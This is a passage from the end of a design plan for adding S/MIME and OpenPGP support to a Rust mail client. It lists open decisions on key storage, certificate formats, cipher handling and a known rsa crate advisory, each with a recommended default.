     one-click CRL fetch over `browser_engine`'s SSRF-guarded path; **no OCSP,
     ever** (§4.4 — an auto-fetch of an attacker-chosen URL is a tracking pixel
     in PKI costume). LDAP only if it can be fully generic: **no institution
     hostname or base-DN preset may ever ship in this repository.**
     - [ ] 🤖 Automated test — n/a while deferred
     - [ ] 🖐️ Manual test — n/a while deferred
```

---

## 16. Open questions / decisions for the user

Each carries a recommended default so silence is a decision rather than a stall.

1. **If Phase 0 fails** (webpki rejects real certificates): accept an OpenSSL
   binding with the full cost of §2.6, or drop S/MIME and ship OpenPGP only?
   → *Recommend: ship OpenPGP.* The no-OpenSSL invariant is load-bearing in three
   separate places, and rPGP is a complete implementation rather than a
   type library.
2. **Store unlock default**: passphrase (prompt once per session) or keychain
   (silent, but the locked-collection state is real)?
   → *Recommend: passphrase as the default, keychain as an explicit opt-in.*
3. **Is store encryption on by default for a *new* install?**
   → *Recommend: offered at first-account creation, defaulting to on with a
   keychain-backed key* — a new store has nothing to migrate, so the cost is one
   checkbox and the §10.10 migration never has to run for that user.
4. **Do we ever render decrypted HTML?** Plain-text-only permanently, or the
   per-message opt-in click of §11.2?
   → *Recommend: plain-text default with the per-message click.* Permanent
   refusal is tempting and probably too strict for real work mail.
5. **Sent copies at all?** Today there are none, which is accidentally the most
   private behaviour available.
   → *Recommend: add them (Phase 6) with mandatory encrypt-to-self* — a mail
   client with no Sent folder is a surprising mail client.
6. **Which algorithms may be refused?** Is refusing 3DES-encrypted incoming mail
   acceptable in the user's environment, or does a correspondent still send it?
   → *Recommend: accept 3DES on receipt with a "weak cipher" marker, never
   produce it.* (Needs a real-world answer.)
7. **LDAP directory lookup**: worth building given no presets may ship and every
   user must type their own host and base DN?
   → *Recommend: no, until asked for twice.*
8. **Does the user's issued certificate actually come as a `.p12`?** If it is
   non-exportable in a platform store, or lives on a **smartcard / PIV token**,
   **none of §3 works** and the answer is PKCS#11 — a different plan with a
   different dependency (`cryptoki`) and different platform problems.
   **Answer this before Phase 2 starts.**
9. **Argon2id parameters** — memory/time/parallelism, i.e. how long an unlock may
   take on the user's slowest machine. → *Recommend: 64 MiB / t=3 / p=1 as a
   starting point, tuned by the §14.4 measurement and recorded in `keyring.json`.*
10. **Accept `rsa` under RUSTSEC-2023-0071 for Phase 4**, with §11.3's structural
    mitigations and a permanent `cargo audit` finding — or block Phase 4 until
    `rsa 0.10` stabilises with constant-time code?
    → *Recommend: accept, and document it in `Cargo.toml`.* Phase 3 is unaffected
    and delivers most of the value, so the cost of being wrong is bounded.

---

*Nothing in this plan has been built. Every crate version, feature list and API
signature above was checked on 2026-07-28 against crates.io and docs.rs and is
recorded so it can be re-checked rather than believed; the ones that gate a
decision (`cms`'s missing open/verify, `x509-cert`'s missing path validation,
`webpki::KeyUsage::required`, `rsa`'s unpatched advisory) are the ones to verify
again before Phase 0.*
